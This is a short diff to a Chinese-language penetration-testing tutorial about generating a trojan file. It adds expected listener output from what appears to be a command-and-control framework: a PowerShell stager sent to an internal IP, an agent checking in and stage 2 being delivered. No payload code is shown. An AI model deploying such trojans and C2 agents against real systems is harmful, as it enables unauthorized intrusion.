@@ -60,5 +60,10 @@ execute			# set生效，生成木马文件
 # 结果
 如果一切正常的话监听机有回显如下
 ```
+[*] Sending POWERSHELL stager (stage 1) to 10.203.87.61
+[*] New agent NCU84961 checked in
+[+] Initial agent NCU84961 from 10.203.87.61 now active (Slack)
+[*] Sending agent (stage 2) to NCU84961 at 10.203.87.61
 
+# 会显示
 ```
